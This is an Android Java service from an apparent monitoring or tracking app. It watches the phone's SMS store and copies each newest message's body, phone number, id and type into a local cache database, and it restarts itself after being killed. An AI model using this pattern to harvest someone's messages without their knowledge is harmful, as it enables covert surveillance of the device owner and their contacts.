package org.gdocument.gchattoomuch.p2p.client.service;

import java.util.Calendar;

import org.gdocument.gchattoomuch.p2p.client.db.service.DbSmsCacheService;
import org.gdocument.gchattoomuch.p2p.client.model.Sms;
import org.gdocument.gtracergps.launcher.log.Logger;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;

public final class OutgoingSMSService extends Service {

	private static final String TAG = OutgoingSMSService.class.getSimpleName();
    private static final String CONTENT_SMS = "content://sms/";
    static String messageId="";


    private class MyContentObserver extends ContentObserver {
        public MyContentObserver() {
            super(null);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Cursor cur = null;
            try {
	            logMe("Caller History: Observer Chanded.");
	
	            Uri uriSMSURI = Uri.parse(CONTENT_SMS);
				cur = OutgoingSMSService.this.getContentResolver().query(uriSMSURI, null, null, null, null);
	             // this will make it point to the first record, which is the last SMS sent
	            cur.moveToNext();
	
	            String message_id = cur.getString(cur.getColumnIndex("_id"));
	            String type = cur.getString(cur.getColumnIndex("type"));
	            String message = cur.getString(cur.getColumnIndex("body"));
	            String phoneNumber = cur.getString(cur.getColumnIndex("address"));
	            String time = Long.toString(Calendar.getInstance().getTimeInMillis());
	
				DbSmsCacheService smsDataSource = new DbSmsCacheService(OutgoingSMSService.this, null);
				Sms sms = new Sms(phoneNumber, message, message_id, time, type);
				smsDataSource.create(sms);
            } catch (RuntimeException e) {
            	logMe(e);
            } finally {
            	if (cur != null) {
            		cur.close();
            	}
            }
        }
    }


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        MyContentObserver contentObserver = new MyContentObserver();
        ContentResolver contentResolver = getBaseContext().getContentResolver();
        contentResolver.registerContentObserver(Uri.parse(CONTENT_SMS),true, contentObserver);
        logMe("Caller History: Service Created.");
    }

    @Override
    public void onDestroy() {
        logMe("Caller History: Service Stopped.");    
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
    	logMe("Caller History: Service StartCommand.");
        /**
         *   Constant to return from onStartCommand(Intent, int, int): if this service's process is killed while it is started 
         *   (after returning from onStartCommand(Intent, int, int)), then leave it in the started state but don't retain this delivered intent. 
         *   Later the system will try to re-create the service. Because it is in the started state, it will guarantee to call 
         *   onStartCommand(Intent, int, int) after creating the new service instance; if there are not any pending start commands to be 
         *   delivered to the service, it will be called with a null intent object, so you must take care to check for this.
         *   This mode makes sense for things that will be explicitly started and stopped to run for arbitrary periods of time, such as a 
         *   service performing background music playback.
         */
        return START_STICKY;

    }

    @Override
    public void onStart(Intent intent, int startid) {
        logMe("Caller History: Service Started.");
    }

	private void logMe(Exception ex) {
		Logger.logMe(TAG, ex);
	}

	private void logMe(String message) {
		Logger.logMe(TAG, message);
	}
}